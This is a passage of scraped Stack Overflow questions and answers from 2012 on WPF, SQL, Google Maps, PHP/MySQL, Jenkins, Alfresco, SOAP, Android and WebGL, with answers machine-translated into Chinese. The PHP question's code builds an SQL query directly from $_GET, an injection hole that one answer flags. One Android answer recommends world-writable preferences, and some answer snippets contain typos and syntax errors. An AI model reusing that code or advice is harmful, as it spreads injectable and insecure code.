        <ColumnDefinition Width="150*" />
    </Grid.ColumnDefinitions>

    <Button Click="Button_Click_1" Grid.Column="1" Grid.Row="1" Margin="10" >
        <StackPanel>
            <Image x:Name="myImage" VerticalAlignment="Stretch" HorizontalAlignment="Stretch" Margin="5"/>
        </StackPanel>
    </Button>

    <Canvas x:Name="mouseCanvas" Margin="-24,263,24,-263"/>
</Grid>
</Window> 
```

In the code above the Convas is my custom pointer.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T16:00:04.350

尝试

```
<Canvas x:Name="mouseCanvas" Grid.ColumnSpan="2" Grid.RowSpan="2" Margin="-24,263,24,-263"/> 
```

这将允许您的画布使用所有可用的行和列。因为每个都有两个，所以将 Spans 设置为“2”意味着整个网格。

# sql - How to order by relevancy including word order in SQL

> ID：12427858
> 
> 赞同：0
> 
> 时间：2012-09-14T15:45:27.723
> 
> 标签：sql, words, relevance, sql-order-by

I'm creating a 'smart' search engine that will look into database by relevancy. My system calculate how many words in your sentence correspond to the database field 'tag_clean' that contains text, and try to get the proper result (one per research).

For example you get 'search youpla boom' in a tag_clean field, and another entry like 'search youpla bim' if you tape 'search bim' it will show the second entry.

My system set one point per word and get the most relevant as result. Everything works but my big problem is, it ignores completely the words order !

If you have 'google image test' and 'google test' and you search 'google test image' with my system, the most relevant will be the first one, but it's the second one that's right.

I'd like a system that understand the importance of word orders, but i've no idea how to do it in SQL.

A sample of my SQL request (important part is CASE WHEN at the end):

```
SELECT * 
FROM keywords 
WHERE tag_clean LIKE 'google%' 
    AND (static = 0) 
    AND 
    (
        tag_clean LIKE '%google%' 
        OR tag_clean LIKE '%test%' 
        OR tag_clean LIKE '%image%'
    )
    OR 
    (
        tag_clean = 'google test image' 
        AND static = 1
    ) 
ORDER BY 
    ((CASE WHEN tag_clean LIKE '%google%' THEN 1 ELSE 0 END) 
        + (CASE WHEN tag_clean LIKE '%test%' THEN 1 ELSE 0 END) 
        + (CASE WHEN tag_clean LIKE '%image%' THEN 1 ELSE 0 END)) 
DESC LIMIT 0, 1; 
```

Thank you people :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:51:58.400

首先，我不确定原始 SQL 是不是最好的工具。您应该查看您使用的任何引擎的全文功能。搜索文本是一个相当解决的问题，并且数据库支持此功能（通过对基础语言的扩展）。

假设你想继续，问题是你的结构。您可以开始为标签清除添加额外的子句，例如 '%google test%' 和所有其他双向组合。这可能是一个快速而肮脏的解决方案。

您真正的问题是您将关系数据存储在单个字段中。应该有一个关键字表，每个文档上的每个关键字都有一个单独的行。这将具有以下列：documentID、KeyWord 和 KeyWordPosition。使用 KeyWordPosition，您可以开始进行所需的邻近搜索。

但是，您最好研究现有软件中的全文功能。

# javascript - 谷歌地图加载不出来

> ID：12427862
> 
> 赞同：-1
> 
> 时间：2012-09-14T15:45:45.503
> 
> 标签：javascript, jquery, google-maps-api-3, callback

问题是我无法使用以下代码加载谷歌地图。地图画布为空白，Chrome 正在抛出

> 未捕获的类型错误：未定义不是函数

这是代码：

```
var MYAPP = MYAPP || {};    
MYAPP.Map = function() {
        var _map = null;
        return{
            init: function() {
                _map = document.getElementById('map_canvas');

                var src = 'http://maps.googleapis.com/maps/api/js?sensor=false&' + 
                'callback=MYAPP.Map.googleMapsCallback';

                $.getScript(src);
            },
            googleMapsCallback: function() {
                var options = {
                    zoom: 15,
                    center: new google.maps.Latlng(13.353988,33.815918),
                    mapTypeId: google.maps.MapTypeId.ROADMAP
                };
                var gMap = new google.maps.Map(_map, options);
                this.displayMarkers();
            },
            displayMarkers: function() {
                //markers code
            }
        };
    }(); 
```

我正在使用`$.getScript`指定的回调函数“googleMapsCallback”异步加载gMaps。回调函数正在触发，但地图不会加载。脚本在这一行中断：

```
new google.maps.Latlng(13.353988,33.815918), 
```

任何人都知道为什么会发生这种情况以及如何解决它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:56:02.450

你拼错了函数：

`Latlng`而不是`LatLng`（第二个“L”大写！）

# c# - 获取日期选择器看起来像 Windows 任务计划程序中提供的那些

> ID：12427864
> 
> 赞同：2
> 
> 时间：2012-09-14T15:45:49.107
> 
> 标签：c#, .net, winforms

我想在 WindowsForms 中获得一个与 Windows 任务计划程序中提供的一样紧凑的日期选择器：
![在此处输入图像描述](../Images/d533a65f398147d86d43f20fd7fffb67.png)

它是日历的隐藏选项，还是自定义开发？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:51:27.460

我用两个日期/时间选择器来做 - 一个用于日期，一个用于时间。（根据我的桌面主题 - Windows Classic，我的可能看起来不同）

![在此处输入图像描述](../Images/22e72fbc2d63417398a65dc7ce386c65.png)

*   日期一的格式属性设置为“短”。
*   将 Format 属性设置为自定义的时间，并将 CustomFormat 设置为 hh:mm ttso 它将读取“12:00 PM”。您可以根据需要更改格式。

然后在代码中，我将两者结合起来得出一个完整的 DateTime。

```
 DateTime dt = DateTime.MinValue;
 try
 {
    dt = dateTimePicker1.Value.Date.Add(dateTimePicker2.Value.TimeOfDay);

 } 
```

# iphone - How to check if device is LTE, 3G, HSPA or Wi-Fi?

> ID：12427865
> 
> 赞同：5
> 
> 时间：2012-09-14T15:46:01.310
> 
> 标签：iphone, ios, xcode, cocoa-touch, cellular-network

Is it possible to determine which kind of network is on the device when the user is interacting with my app?

Right now I have the Reachability class and I can differentiate between Wi-Fi and Cellular, but how to check if the Cellular is LTE, 3G, HSPA, EDGE?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T09:44:06.557

目前没有办法区分不同类型的蜂窝网络。

有关更多信息，请参阅[此问题。](https://stackoverflow.com/questions/12668021/is-there-any-way-to-know-what-network-an-iphone-is-connected-to-lte-vs-gsm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-09T01:22:25.853

从 iOS7 开始，可以使用 CTTelephonyNetworkInfo() 获得有关蜂窝连接的信息：

```
let info = CTTelephonyNetworkInfo()
print(“carrierName": " + "\(info.subscriberCellularProvider?.carrierName ?? "Has not been configured for carrier")")
print(“currentRadioAccessTechnology: " + "\(info.currentRadioAccessTechnology ?? "Airplane Mode/No cell connection")") 
```

currentRadioAccessTechnology 将显示一个描述连接类型的字符串。

# ajax - ASP.NET MVC 3, Ajax.BeginForm, OnBegin and form validation

> ID：12427866
> 
> 赞同：0
> 
> 时间：2012-09-14T15:46:05.557
> 
> 标签：ajax, asp.net-mvc-3

I am using Ajax.BeginForm and wish to pass in parameters to the function called with OnBegin. The following are two code snippets.

```
new AjaxOptions
{
   HttpMethod = "POST",
   UpdateTargetId = "DataEntrySummary",                
   OnBegin = "ValidateForm(11,55)"
}

function ValidateForm(minAge, maxAge) {return false;} 
```

The parameters are passed in correctly to the ValidateForm function but the function always returns true.

If I take the parameters out and use

```
OnBegin = "ValidateForm()"
function ValidateForm() {return false;} 
```

It works perfectly and returns false. Am I missing something or are parameters not allowed here or ...

Puzzled of Oxford - thanks in advance.

PS - I cannot use C# Attributes and Unobtrusive validation for very good reasons (these *are* code snippets).

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T09:55:24.043

利用

```
OnBegin = "return ValidateForm(11,55)"

function ValidateForm(a,b) {
    return a<b;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T08:44:20.053

我不确定 CrazyCoderz 的评论是如何关联的，但它是如何关联的。

我发现函数名之后的任何内容都会导致 Ajax OBegin 返回 true。这包括 OnBegin = "ValidateForm()"。[我在括号中的错误]

我现在正在实现一个“解决方法” - 两个之一 - 要么编写我自己的 Ajax 调用，*要么*从表单的测试输入元素中读取属性以获得我想要的值。所以，感谢 CrazyCoderz 让我走上解决方案的轨道。

# php - Setting value in mysql table using html button

> ID：12427869
> 
> 赞同：0
> 
> 时间：2012-09-14T15:46:35.063
> 
> 标签：php, mysql, html

I got a table with dynamic data with 5 td-s. First one is for the ID, second one for date, third for the name of the author, fourth for some properties and in the last one i got two buttons. I want them to change the value of the $status in applications table. For that I made 2 php files in which I added the mysql update function for each of the buttons. But I don't know why when I press the buttons it does everything in the php except it doesn't change the value of $status. Please let me know where I am wrong and how can I make it work. Thanks in advance.

The html code of the buttons (the last td):

```
<form action="status1.php">
<input type="submit" name="approve" value=" + ">
</form>
<form action="status2.php">
<input type="submit" name="refuse" value=" - ">
</form> 
```

The PHP code for the buttons - status1.php (status2.php is the same but it changes the $status value to 2 instead of 1)

```
<?php
    require_once('config.php');
    $link = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
    mysql_query('set names windows-1251', $link);
    if(!$link) {
        die('Failed to connect to server: ' . mysql_error());
    }
    $db = mysql_select_db(DB_DATABASE);
    if(!$db) {
        die("Unable to select database");
    }
    $id=$_GET['id'];
    $qry="UPDATE applications SET status=1 WHERE id='$id'";
    $result = mysql_query($qry);
        if($result) {
            header("location: applications.php");
            exit();
        }
        else {
            die("Query failed");
        }
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:52:10.627

您正在使用`$_GET['id']`作为标识符，但据我在代码中看到的，除了提交按钮本身之外，您实际上并没有发送任何 GET 信息。因此，您的查询当前实际上正在更新 row `WHERE id=''`。这就是为什么你没有得到错误，但你也没有得到你想要的结果。

将表单的 action 参数更改为`status1.php?id=$id`，或在表单内添加类似`<input type="hidden" name="id" value="$id"/>`的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:03:06.930

嗯，你有什么错误吗？注释掉标题（“位置：applications.php”）；线，所以你会看到它是否抛出任何东西。还可以尝试添加类似 echo $qry 的内容，这样您就可以直观地验证查询是否正确。

此外，您应该阅读 SQL 注入以及如何防范它。像这样直接将用户输入粘贴到查询中可能会带来麻烦。此外，您没有检查用户输入的撇号，这可能会破坏您的查询。我个人使用 PDO，这使它更容易也更安全。

另一个建议，不必维护两个单独的提交 PHP 文件，只需像这样放置两个提交按钮：

```
<input type="submit" name="status" value=" + ">
<input type="submit" name="status" value=" - "> 
```

然后将表单操作更改为合并的 php 文件的名称，在该文件中，只需评估状态的值，如：

```
$status = 0;
if ($_GET["status" == " + ") $status = 1; 
```

如果你安装 PDO，你会像这样进行数据库更新：

```
$pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_DATABASE, DB_USER, DB_PASSWORD);
$sql = $pdo->prepare("UPDATE applications SET status=? WHERE id=?");
$sql->execute(array($status, $_GET["id"])); 
```

..这会比你现在做的更安全。

免责声明：我只是一个业余爱好者 PHP 程序员，所以可能有比我提到的更好的方法 :)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:55:27.830

使用这个而不是你的表单标签作为表单 1

```
<from method="get" action="status1.php">

<input type="hidden" name="id" value="1"/>

<input type="submit" name="approve" value=" + "/>

</form> 
```

表格 2

```
<from method="get" action="status2.php">

<input type="hidden" name="id" value="2"/>

<input type="submit" name="refuse" value=" - "/>

</form> 
```

# jenkins - Hudson / Jenkins: share parameters between several jobs

> ID：12427871
> 
> 赞同：6
> 
> 时间：2012-09-14T15:46:46.847
> 
> 标签：jenkins, hudson, parameter-passing

I have about 20 jobs using common parameters (user, password), and sometimes the password expires... So I have to change it on all jobs, which is really time consuming (and error prone, I may forget one).

I thought about:

*   using a kind of magic property file if that exists to have directly lines like KEY, VALUE added into job parameters
*   adding the same kind of KEY, VALUE pair directly inside `build.xml`, but where ? And it's really ugly... Maybe with a dedicated XML embedded into the `build.xml` ?
*   calling a slave job that would (how ?) push up to the parent one the desired values...

As you can see I'm only starting in Hudson/Jenkins (I'm using Jenkins 1.424.2.2), thanks for your help !

**EDIT:** I'm not admin of the Jenkins instance, so I cannot have access to global properties...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T07:14:05.753

转到您的 Jenkins 家并导航：

1.  管理詹金斯 >
2.  配置系统 >
3.  全球属性 >
4.  环境变量 >`....`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:02:26.433

我可以想到两种方法：

*   使用*全局属性*，在**Manage Jenkins** -> **Configure system**下找到。在这里，您可以定义所有作业都应该可用的环境变量。

*   编写一个小脚本来下载、修改和发布作业配置：`http://[jenkinshost]/job/[jobname]/config.xml`.

您可以在 下阅读有关 api 功能的信息`http://[jenkinshost]/job/[jobname]/api`，以下是有关阅读和更改 config.xml 的内容：

> **获取/更新 config.xml**
> 
> 要以编程方式获取 config.xml，请点击 `[http://[jenkinshost]/job/[jobname]/config.xml]`。您还可以将更新的 config.xml 发布到相同的 URL，以编程方式更新作业的配置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T09:19:25.293

我最终成功了：

*   在网页中保存加密凭据
*   借助shell 脚本 (wget) 在 Hudson 中检索它们，解密它们，并`build.properties`在工作区中使用行创建一个文件`name=value`（在我的情况下`ssh.password=...`）

这是可行的，因为 Ant 构建步骤检测到这个文件并将其中的变量传递到它们的上下文中。多亏了这一点，我可以集中我的凭据。

# javascript - 如何从 Alfresco Javascript 中访问本地 CSS 文件？

> ID：12427875
> 
> 赞同：0
> 
> 时间：2012-09-14T15:46:53.523
> 
> 标签：javascript, html, css, parsing, alfresco

所以我已经能够在 Alfresco 中弄清楚，有一个名为的表单`skin.css`可以让我更改数据表项的突出显示颜色。但是，我只希望能够在工作流过程中更改此属性，而不是因为它适用于整个 Share 网站中的所有数据列表元素。

首先，我有一个脚本，它根据规则启动并将任何更新/新文件移动到指定文件夹中，然后启动该文件的工作流。在启动工作流时，包项目列表将填充与刚刚移动的文档/工作流启动的文档位于同一文件夹中的所有文档。下面是脚本：

```
function main()
{
    var counter=0;
    //Administrative Adjudication space/folder MUST exist under companyhome.
    var rootSpaceName = companyhome.childByNamePath("mainFolder");

    //If the rootspacename is null (not previously created), then exit the program as we have nothing to do.
    if(rootSpaceName == null)
    {
        logger.log("Company Home/mainFolder does not exist, so we have nothing to do.");
        return;
    }
    else
    {
        logger.log("Company Home/mainFolder exists, so carry on our process.");
        //Creates an array of all the children under the rootSpaceName
        var childList = rootSpaceName.children;
        //Creates a variable which counts the number of children in the childList array
        var count = childList.length;
        //var seconds = new Date().getTime() / 1000;

        //If there are no children in the rootSpaceName folder, exit the program.
        if(count == 0)
        {
            logger.log("Company Home/mainFolder does not have child, nothing to do.");
            return;
        }
        else
        {
            for(var i = 0; i < count; i++)
            {
                //Title MUST exist.
                var childTitle = childList[i].properties["hearing:childTitle"];
                //Author MUST exist.
                var childAuthor = childList[i].properties["hearing:childAuthor"];
                logger.log("childTitle: " + childTitle);
                logger.log("childAuthor: " + childAuthor);

                if(childTitle == null || childAuthor == null)
                {
                    logger.log(i + ". Both the childTitle and childAuthor are null...");
                    continue;                             
                }

                var child = childList[i];

                if(child.isContainer == false)
                {
                    for(var j = 0; j < count; j++)
                    {
                        var newChildName = childList[j].properties.name;
                        logger.log("New child name: " + newChildName);
                        var newChild = childList[j];

                        if((newChild.isContainer == true) && (childTitle == newChildName))
                        {
                            logger.log("There is a currently existing folder with the same name as the title of original child");
                            var newSpaceName = rootSpaceName.childByNamePath(newChildName);
                            var newChildList = newSpaceName.children;
                            var newCount = newChildList.length;

                            for(var k = 0; k < newCount; k++)
                            {
                                var newNewChildName = newChildList[k].properties.name;
                                var newNewchildAuthor = newChildList[k].properties.author;
                                var newNewChild = newChildList[k];

                                if((newNewChild.isContainer == true) && (newNewchildAuthor == childAuthor))
                                {
                                    var currentSpace = newSpaceName.childByNamePath(newNewChildName);                                  

                                    if(child.isDocument == true)
                                    {
                                        //Only want the workflow to run once so we increment count
                                        counter=counter+1;
                                        child.move(currentSpace);
                                        //If Count is 1, then run workflow
                                        if(counter==1)
                                        {                   
                                            //starts HelloWorldUI workflow                 
                                            var wfdef=workflow.getDefinitionByName("activiti$helloWorldUI");

                                            if(wfdef)
                                            {
                                                var wfparams=new Array();
                                                wfparams["bpm:workflowDescription"]="";
                                                wfparams["bpm:groupAssignee"]=people.getGroup("GROUP_Managers");

                                                var wfpackage=workflow.createPackage();
                                                var rootSpaceName=currentSpace;
                                                var childList=rootSpaceName.children;
                                                var count=childList.length;

                                                //add all existing documents in the space to the workflow
                                                for(var i = 0; i < count; i++)
                                                {
                                                    wfpackage.addNode(childList[i]);
                                                }

                                                var wfpath=wfdef.startWorkflow(wfpackage,wfparams);
                                                var tasks=wfpath.getTasks();

                                                for each(task in tasks)
                                                {
                                                    task.endTask(null);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        else

                        {
                            // If title folder is already created, not need to create again.
                            var newSpaceName = companyhome.childByNamePath("mainFolder/" + childTitle);

                            if(newSpaceName == null)
                            {
                                newSpaceName = rootSpaceName.createFolder(childTitle);
                                logger.log("mainFolder/" + childTitle + " is created.");
                            }

                            // If author folder is already created, not need to create again.
                            var newNewSpaceName = companyhome.childByNamePath("mainFolder/" + childTitle + "/" + childAuthor);

                            if(newNewSpaceName == null)
                            {
                                newNewSpaceName = newSpaceName.createFolder(childAuthor);
                                logger.log("mainFolder/" + childTitle + "/" + childAuthor + " is created.");
                            }

                            if(child.isDocument == true)
                            {
                                counter=counter + 1;
                                child.move(newNewSpaceName);

                                if(counter == 1)
                                {
                                    var wfdef=workflow.getDefinitionByName("activiti$helloWorldUI");

                                    if(wfdef)
                                    {
                                        var wfparams=new Array();
                                        wfparams["bpm:workflowDescription"]="";
                                        wfparams["bpm:groupAssignee"]=people.getGroup("GROUP_Managers");
                                        var wfpackage=workflow.createPackage();
                                        var rootSpaceName=newNewSpaceName;
                                        var childList=rootSpaceName.children;
                                        var count=childList.length;

                                        //add all items from the space to the workflow
                                        for(var i = 0; i <c ount; i++)
                                        {
                                            wfpackage.addNode(childList[i]);
                                        }   

                                        var wfpath=wfdef.startWorkflow(wfpackage,wfparams);
                                        var tasks=wfpath.getTasks();

                                        for each(task in tasks)
                                        {
                                            task.endTask(null);
                                        }

                                    }
                                }
                                logger.log("Moving file " + child.properties.name);
                            }
                        }
                    }
                }
            }
        }
    }
    return;
}

main(); 
```

我希望能够创建某种类型的函数，该函数只能在工作流程过程中调用以访问 skin.css 文件，并且基本上`.yui-skin-default tr.yui-dt-first{background-color:#FFF}`在 CSS 文件中设置。有谁知道我会怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:11:54.590

我找到了一个书签，可以让你在任何你想要的页面上注入 CSS 文件。唯一的缺点是每次加载页面时都必须运行它。

[http://allben.net/post/2010/01/30/CSS-JavaScript-Injection-Bookmarklets.aspx](http://allben.net/post/2010/01/30/CSS-JavaScript-Injection-Bookmarklets.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-15T05:30:22.007

如果您只想在**启动工作流**`start-workflow.css`页面中进行更改，您的css 应写入`start-workflow.get.head.ftl`. 这个 css 将覆盖在其他 css 文件中，如 skin.css。

像这样，您可以覆盖任何 css 以仅影响启动工作流页面而不影响其他页面。您可以尝试其他工作流相关页面。

# java - How to add Custom Header to SOAP request via jaxb WITHOUT using SoapHandler

> ID：12427876
> 
> 赞同：2
> 
> 时间：2012-09-14T15:46:54.830
> 
> 标签：java, web-services, header, jax-ws

I can't seem to find a way to add in custom header to a Soap request from web service client without using SOAPHandler. I look around for alternatives and BindingProvider seems to do the the job for me. But it didn't work. I am not sure what am I missing here. Here's what I want my request to look like:

```
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ws="http://xx.xx.xx/xxx/provisioning/ws">
   <soapenv:Header>   
                <ws:XXXSecurity xmlns:ws="http://xx.xx.xx/xx/security/ws">
                <ws:Identification type="TrustedApplicationIdentification">
                <ws:ApplicationId>xx</ws:ApplicationId>
                </ws:Identification>
                </ws:xxSecurity>
      <ws:xxLocale xmlns:ws="http://xx.xx.xx/xx/presentation/webservice/locale">
        <ws:clientLocale>en_US</ws:clientLocale>
      </ws:xxLocale>
   </soapenv:Header>
   <soapenv:Body>
      <ws:GetAllNonProvisionedServers/>
   </soapenv:Body>
</soapenv:Envelope> 
```

here the code:

```
Provisioning service = new Provisioning(url, qName);
ProvisioningPort servicePort = service.getProvisioningPort();

servicePort = service.getProvisioningPort();

Map<QName, List<String>> headersMap = new HashMap<QName, List<String>>();

String mySoapHeader = "<ws:Identification type=\"TrustedApplicationIdentification\">"
    + "<ws:ApplicationId>Password123$</ws:ApplicationId>"
    + "</ws:Identification>" ;//+ "</soapenv:Header>";

List<String> mySOAPHeaders = new ArrayList<String>();
mySOAPHeaders.add(mySoapHeader);
headersMap.put(qSecurityName, mySOAPHeaders);

System.out.println(MessageContext.HTTP_REQUEST_HEADERS);

BindingProvider bp = (BindingProvider) servicePort;
List<Server> findAllNonProvisionedServers = servicePort
            .findAllNonProvisionedServers(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T14:07:49.317

```
 MemberSubmissionEndpointReference endPointReference = new MemberSubmissionEndpointReference();
        Elements referenceParameters = endPointReference.referenceParameters;
        List<Element> elements = referenceParameters.elements;

        SOAPPartImpl soappartImpl = new SOAPPart1_1Impl();
        soappartImpl.addMimeHeader("SOAPAction", "http://www.abc.com/WebServices/UploadService/ProcessUpload");
        SOAPDocumentImpl soapdocumentimpl = new SOAPDocumentImpl(soappartImpl);     
        SOAPHeader ele = new Header1_1Impl(soapdocumentimpl, "");       
        elements.add(ele);

        ProvisioningPort port = service.getPort(endPointReference, EDMOnlineUploadServiceSoap.class, null); 
```

上面的示例将向您展示如何将 MIME 标头添加到 Web 服务请求。以上代码可以作为参考。但这不是一个完整的工作解决方案。在我看来，MemberSubmissionEndpointReference 将适用于 WS-Addressing。请检查其他标头参数。

还有其他方法可以生成 ws 客户端，这将允许您轻松设置标头。请也尝试一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T15:27:34.657

我使用了 org.apache.axiom.soap.SOAPFactory 类来设置我的 WS-Addressing SOAP Headers。让我知道您用来调用 Web 服务的 API，以便我可以尝试帮助您。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T21:28:36.477

谢谢你们，但似乎 SOAPHandler 是正确的方法，所以我要这样做。

# android - Shared Preferences is not retaining anything

> ID：12427878
> 
> 赞同：0
> 
> 时间：2012-09-14T15:46:59.527
> 
> 标签：android, sharedpreferences

I know this has been asked a lot around SO, but I just can't seem to get this working. Situation : I have a dialog with a EditText in it with an accept button. I would like to store the value of the string with SharedPreferences when the user touch the accept button. Here's the code I have so far.

```
public void showDialog()
{
    final Dialog dialog = new Dialog(VentilationActivity.this);
    dialog.setContentView(R.layout.menu_options);       
    dialog.setTitle("Configuration de l'adresse IP");           
    dialog.setCancelable(true);     
    dialog.show();

    EditText adressIp = (EditText) dialog.findViewById(R.id.editText1);

    SharedPreferences preferences = getSharedPreferences("Agrinuvo", 0);  
    String texte = preferences.getString("VentIpKey", "");

    adressIp.setText(texte); 

    InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
    imm.showSoftInput(adressIp, InputMethodManager.SHOW_IMPLICIT);

    Button btnAccept = (Button) dialog.findViewById(R.id.button1);
    btnAccept.setOnClickListener(new OnClickListener() 
    {
        @Override
        public void onClick(View v)                                                         
        {
            EditText adressIp = (EditText) dialog.findViewById(R.id.editText1); 
            textIp = adressIp.getText().toString();

            SharedPreferences preferences = getPreferences(MODE_PRIVATE); 
            SharedPreferences.Editor editor = preferences.edit();
            editor.putString("VentIpKey", textIp);
            editor.commit();

            InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.hideSoftInputFromWindow(adressIp.getWindowToken(), 0);
            dialog.dismiss();                                                               
        }
    }); 
} 
```

And, of course this is not working. Everytime I close the dialog window and reopen it the EditText text is empty. Thanks for any help you can provide.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:56:24.887

在你的内部，你`onClickObserver`为一个以你的活动的类名命名的文件创建一个 SharedPreference 对象。至少这是 Activity 的`getPreferences(int)`文档所述。尝试以与您相同的方式初始化该对象`showDialog`或使`showDialog`'`preferences`最终。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:27:20.147

我在我的应用程序中使用首选项已经有一段时间没有太多问题了，我会建议几件事：

getSharedPreferences() 应该只用于不同活动之间共享的偏好。如果只有您的一个 Activity 将使用数据，请使用它来保存：

```
 SharedPreferences settings  = getPreferences (MODE_PRIVATE);
    SharedPreferences.Editor ed = settings.edit();

    ed.putBoolean ("BooleanKey", booleanVar);
    ed.putInt     ("IntKey", intVar);
    ed.putFloat   ("FloatKey", floatVar);
    ed.putLong    ("LongKey",  longVar);

    ed.commit(); 
```

这要检索：

```
 SharedPreferences settings = getPreferences (MODE_PRIVATE);
    longVar = settings.getLong ("longKey", 0);
    ... 
```

如果您要在 Activites 之间共享您的偏好，那么您需要使用 getSharedPreferences()，但您不希望使用 MODE_PRIVATE。目前，我在编写数据的代码中使用 MODE_WORLD_WRITEABLE，在读取数据的地方使用 MODE_WORLD_READABLE，这可能不是最好的方法（至少，如果我从 Eclipse 得到的警告是可信的）。

祝你好运，
R。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T15:56:30.457

在以下行中，您的 onclick 方法中可能存在错误

```
SharedPreferences preferences = getPreferences(MODE_PRIVATE); 
```

如果您将其更改为

```
SharedPreferences preferences = getSharedPreferences("Agrinuvo", Context.MODE_PRIVATE); 
```

它应该工作。按照您的称呼方式，您并没有获得与对话请求相同的偏好。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T15:53:01.843

怎么样;

```
public void showDialog() {
    ....
    final SharedPreferences preferences = getSharedPreferences("Agrinuvo", 0);
    ....
        @Override
        public void onClick(View v) {
            ....
            // Use previous preferences instance instead.
            // SharedPreferences preferences = getPreferences(MODE_PRIVATE); 
            SharedPreferences.Editor editor = preferences.edit();
            editor.putString("VentIpKey", textIp);
            editor.commit();
            ....
        }
    }
} 
```

无论如何，似乎您正在写入与读取默认值不同的首选项。

# webgl - 调用 glDisableVertexAttribArray() 重要吗？

> ID：12427880
> 
> 赞同：58
> 
> 时间：2012-09-14T15:47:11.777
> 
> 标签：webgl, vertex-shader

我对启用顶点属性数组的范围并不完全清楚。我有几个不同的着色器程序，它们具有不同数量的顶点属性。`glEnableVertexAttribArray`着色器程序的调用是本地调用还是全局调用？

现在，我在创建着色器程序时启用了顶点属性数组，并且从不禁用它们，而且一切似乎都有效，但似乎我应该在绘制调用之前/之后启用/禁用它们。对此有影响吗？

（碰巧我在 WebGL 中，所以我们真的在谈论`gl.enableVertexAttribArray`and `gl.disableVertexAttribArray`。我还要注意，橙皮书*OpenGL Shading Language*对这些调用非常缺乏信息。）

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-09-14T15:56:58.977

启用顶点属性数组的状态可以绑定到顶点数组对象 (VAO)，也可以是全局的。

如果您使用 VAO，则不应*禁用*属性数组，因为它们封装在 VAO 中。

但是，对于全局顶点属性数组启用状态，您应该禁用它们，因为如果它们保持启用状态，OpenGL 将尝试从数组中读取，这可能会绑定到无效指针，如果指针指向客户端地址，这可能会使您的程序崩溃空间，或者如果它指出超出绑定顶点缓冲区对象的限制，则会引发 OpenGL 错误。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-09-15T09:22:09.560

WebGL 与 OpenGL 不同。

在 WebGL 中，只要有一个附加到属性的缓冲区，并且（a）如果它被使用，它就足够大以满足绘图调用，或者（b）它没有被使用，就明确允许启用数组。

与 OpenGL ES 2.0 不同，WebGL 不允许客户端数组。

证明：

```
const gl = document.querySelector("canvas").getContext("webgl");

const vsUses2Attributes = `
attribute vec4 position;
attribute vec4 color;

varying vec4 v_color;

void main() {
  gl_Position = position;
  gl_PointSize = 20.0;
  v_color = color;
}
`;
const vsUses1Attribute = `
attribute vec4 position;

varying vec4 v_color;

void main() {
  gl_Position = position;
  gl_PointSize = 20.0;
  v_color = vec4(0,1,1,1);
}
`
const fs = `
precision mediump float;
varying vec4 v_color;

void main() {
  gl_FragColor = v_color;
}
`;

const program2Attribs = twgl.createProgram(gl, [vsUses2Attributes, fs]);
const program1Attrib  = twgl.createProgram(gl, [vsUses1Attribute, fs]);

function createBuffer(data) {
  const buf = gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data), gl.STATIC_DRAW);
  return buf;
}

const buffer3Points = createBuffer([
  -0.7, 0.5,
   0.0, 0.5,
   0.7, 0.5,
]);
const buffer3Colors = createBuffer([
  1, 0, 0, 1,
  0, 1, 0, 1,
  0, 0, 1, 1,
]);

const buffer9Points = createBuffer([
  -0.8, -0.5,
  -0.6, -0.5,
  -0.4, -0.5,
  -0.2, -0.5,
   0.0, -0.5,
   0.2, -0.5,
   0.4, -0.5,
   0.6, -0.5,
   0.8, -0.5,
]);

// set up 2 attributes
{
  const posLoc = gl.getAttribLocation(program2Attribs, 'position');
  gl.enableVertexAttribArray(posLoc);
  gl.bindBuffer(gl.ARRAY_BUFFER, buffer3Points);
  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);

  const colorLoc = gl.getAttribLocation(program2Attribs, 'color');
  gl.enableVertexAttribArray(colorLoc);
  gl.bindBuffer(gl.ARRAY_BUFFER, buffer3Colors);
  gl.vertexAttribPointer(colorLoc, 4, gl.FLOAT, false, 0, 0);
}

// draw
gl.useProgram(program2Attribs);
gl.drawArrays(gl.POINTS, 0, 3);

// setup 1 attribute (don't disable the second attribute
{
  const posLoc = gl.getAttribLocation(program1Attrib, 'position');
  gl.enableVertexAttribArray(posLoc);
  gl.bindBuffer(gl.ARRAY_BUFFER, buffer9Points);
